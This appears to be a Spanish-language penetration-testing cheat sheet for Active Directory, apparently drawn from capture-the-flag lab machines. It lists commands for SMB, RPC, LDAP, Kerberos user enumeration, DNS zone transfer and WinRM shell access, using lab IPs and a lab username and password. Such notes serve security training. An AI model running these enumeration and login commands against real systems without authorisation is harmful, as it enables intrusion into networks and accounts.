# Técnicas de directorio activo

## Puertos importantes

- 53: DNS
- 88: Kerberos
- 445: SMB
- 135: Windows RPC
- 389: LDAP
- 5985: Administración remota de windows

## Enumeración

Tecnicas de enumeración de directorio activo

### SMB

Si tiene el puerto 445 lo primero es enumerar con **crackmapexec**, **smbmap**, **smbclient**,....

```bash
# Se averigua nombre de maquina y dominio.
crackmapexec smb 10.10.10.175

# Listar recursos compartidos
crackmapexec smb 10.10.10.175 --shares

# smbmap con session nula
smbmap -H 10.10.10.175 -u 'null'

# smbclient con session nula
smbclient -L 10.10.10.175 -N

```

Poner el dominio en /etc/host.

Si se tiene una credencial válida podemos comprobar el usuario.

```bash
# Si pone pwned podríamos acceder con PSEXEC
crackmapexec smb 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'

```

### RPC

Si tiene el puerto 135 podemos enumerar con **rpcclient**.

```bash
# rpcclient con sesion nula
rpcclient -U "" 10.10.10.174 -N

# Enumerar usuarios del dominio:
rcpclient $> enumdomusers

```

### LDAP

Si tiene el puerto 389 podemos enumerar con **ldapsearch**.

```bash
# ldapseacrh -x es simple autentication. traemos los namingcontext
ldapsearch -x -h  10.10.10.174 -N -s base namingcontexts

# ldapseacrh -x es simple autentication. Enumeramos el contexto
ldapsearch -x -h  10.10.10.174 -N -b 'DC=EGOTISTICAL-BANK, DC=LOCAL'
```

### KERBEROS

Si se consiguen usuarios y está el servicio de Kerberos abierto, puerto 88, podemos enumerar con kerbrute y GetNPUsers.

```bash
# kerbrute. Enumera usuarios válidos a partir de un listado
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.174 users.txt

# Lo mismo con Impacket
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
```

### DNS

Si está abierto el puerto 53 podemos intentar un ataque de transferencia de dominio con dig.

```bash
# dig. Enumera los nameservers
dig @10.10.10.174 EGOTISTICAL-BANK.LOCAL ns

# dig. Enumera los servidores de correo
dig @10.10.10.174 EGOTISTICAL-BANK.LOCAL mx

# dig. Domain Zone Transfer Attack
dig @10.10.10.174 EGOTISTICAL-BANK.LOCAL axfr


```

## Administración remota, WINRM

Si está abierto el servicio de administración remota, puerto 5985, podemos atacar el servicio winrm con crackmapexec.

```bash
# Si pone pwned podríamos acceder con evil-winrm
crackmapexec winrm 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'

# Acceso a consola por 
evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
```
## Explotación

```bash
# Acceso a consola evil-winrm. Credenciales válidas y servicio de administración remota  
evil-winrm -i 10.10.10.175 -u 'fsmit' -p 'Thestrokes23'
```